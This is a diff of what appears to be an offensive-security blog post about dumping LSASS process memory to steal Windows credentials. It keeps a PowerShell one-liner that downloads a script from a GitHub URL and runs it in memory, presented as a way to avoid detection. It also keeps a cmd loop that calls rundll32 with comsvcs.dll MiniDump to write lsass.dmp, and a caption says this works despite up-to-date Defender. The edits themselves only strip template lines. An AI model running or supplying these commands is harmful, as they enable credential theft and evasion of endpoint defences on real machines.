@@ -26,22 +26,16 @@ $dumpid = foreach ($process in $processes){if ($process.ProcessName -eq "lsass")
 
 We can also encode and encrypt the script to make it harder to be detected and run it straight in memory via Invoke Expression.
 
-{% include codeHeader.html %}
 ```
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/sp00ks-git/PowerShell-Stuff/main/lsass-dump')
 ```
 
 
-
 Another way is by using a for loop as follows:
 
-{% include codeHeader.html %}
 ```
 for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump ^%B lsass.dmp full
 ```
-
-
-
 
 ![img-description](/images/lsass-1.png)
 _LSASS Dumping with uptodate Defender Definitions"_
